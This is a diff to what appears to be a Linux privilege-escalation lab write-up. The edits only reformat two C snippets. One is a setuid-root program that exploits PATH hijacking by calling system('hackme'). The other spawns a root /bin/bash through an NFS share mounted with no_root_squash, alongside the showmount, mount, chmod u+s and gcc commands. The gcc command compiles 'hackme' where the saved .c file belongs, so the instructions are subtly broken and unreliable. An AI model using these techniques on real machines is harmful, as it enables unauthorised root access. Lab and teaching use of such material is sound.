@@ -151,12 +151,12 @@ PATH in Linux in an environmetnal variable that tells the opterating system wher
 
 The following script will try to execute the hackme binary and will look for it in the $PATH table
 
-`#include<unistd.h>`
-`void main()`
-`{ setuid(0);`
-  `setgid(0);`
-  `system("hackme");`
-`}`
+`#include<unistd.h>
+void main()
+{ setuid(0);
+setgid(0);
+system("hackme");
+}`
 
 Safe this program as a .c file and compile it using gcc `gcc hackme -o shell`
 Now give this compiled file SUID permissions  `chmod u+s shell`
@@ -180,9 +180,9 @@ Network File Sharing or in short NFS config is stored in the /etc/exports file a
 We will first start by enumerating the shares on the machine using the `showmount -e <ip>` command. 
 
 We will mount our folder to the folder with the no_root_squash option enabled. using the `mount -o rw 10.10.70.63:/tmp /tmp/nfs` now your local system is mounted with the system. Go into the the root user using the su command, and make a simple script that call the /bin/bash binary and give it the SUID permissions, now execute the SUID file from your target machine. You can for example use this script: 
-`#include<unistd.h>`
-`void main()`
-`{ setuid(0);`
-  `setgid(0);`
-  `system("/bin/bash");`
-`}`
+`#include<unistd.h>
+void main()
+{ setuid(0);
+setgid(0);
+system("/bin/bash");
+}`
